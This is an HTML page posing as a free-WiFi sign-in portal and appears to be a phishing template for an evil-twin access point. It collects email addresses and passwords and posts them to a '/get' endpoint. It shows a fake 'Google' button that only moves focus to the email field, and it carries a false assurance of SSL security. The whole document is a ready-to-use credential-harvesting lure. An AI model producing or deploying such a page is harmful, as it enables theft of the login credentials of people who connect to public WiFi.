<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free WiFi - Connect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff}
.container{width:90%;max-width:380px;text-align:center}
.card{background:rgba(255,255,255,.08);backdrop-filter:blur(20px);border-radius:20px;padding:40px 30px;border:1px solid rgba(255,255,255,.12);box-shadow:0 8px 32px rgba(0,0,0,.3)}
.wifi-icon{width:60px;height:60px;margin:0 auto 20px;opacity:.9}
.wifi-icon svg{width:100%;height:100%}
h1{font-size:22px;font-weight:600;margin-bottom:6px}
.subtitle{font-size:13px;color:rgba(255,255,255,.6);margin-bottom:28px}
.field{position:relative;margin-bottom:16px}
.field input{width:100%;padding:14px 16px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.15);border-radius:12px;color:#fff;font-size:15px;outline:none;transition:border .2s}
.field input::placeholder{color:rgba(255,255,255,.35)}
.field input:focus{border-color:rgba(99,102,241,.8);background:rgba(255,255,255,.1)}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;margin-top:4px}
.btn:active{transform:scale(.98)}
.btn:hover{box-shadow:0 4px 20px rgba(99,102,241,.4)}
.terms{font-size:11px;color:rgba(255,255,255,.4);margin-top:20px;line-height:1.5}
.terms a{color:rgba(99,102,241,.8);text-decoration:none}
.lock{display:inline-block;margin-right:4px;vertical-align:middle;opacity:.5}
.divider{display:flex;align-items:center;margin:20px 0;gap:12px}
.divider span{font-size:12px;color:rgba(255,255,255,.3);white-space:nowrap}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.1)}
.social-btn{width:100%;padding:12px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:12px;color:rgba(255,255,255,.8);font-size:14px;cursor:pointer;transition:background .2s;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:8px}
.social-btn:hover{background:rgba(255,255,255,.12)}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="wifi-icon">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
</div>
<h1>Welcome</h1>
<p class="subtitle">Sign in to connect to free WiFi</p>
<form method="POST" action="/get">
<div class="field">
<input name="email" type="text" placeholder="Email address" required autocomplete="off">
</div>
<div class="field">
<input name="password" type="password" placeholder="Password" required>
</div>
<button class="btn" type="submit">Connect</button>
</form>
<div class="divider"><span>or continue with</span></div>
<button class="social-btn" onclick="document.querySelector('[name=email]').focus()">
<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
Google
</button>
<p class="terms">
<svg class="lock" width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3-9H9V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2z"/></svg>
Your connection is secured with SSL encryption.<br>
By connecting you agree to our <a href="#">Terms of Service</a>
</p>
</div>
</div>
</body>
</html>
